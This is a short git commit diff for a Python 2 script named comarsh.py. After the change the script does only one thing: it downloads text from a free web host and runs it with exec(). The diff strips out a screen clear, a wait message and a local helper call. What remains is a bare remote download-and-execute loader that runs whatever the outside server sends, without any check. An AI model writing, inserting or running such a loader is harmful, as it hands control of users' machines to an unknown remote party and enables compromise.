27f4d183e61f14546b794a1d1960abcf5826087b
Ahmad Riswanto <35693749+AhmadRiswanto704@users.noreply.github.com>
2019-06-18 19:45:12 +0700

    Update comarsh.py

--- comarsh.py
+++ comarsh.py
@@ -1,7 +1,3 @@
 import requests, os
 z = requests.get('https://comarsh.000webhostapp.com/run.txt').text
-os.system('clear')
 exec(z)
-os.system('clear')
-print "[#] Please Wait..."
-os.system('python2 data/com.py')
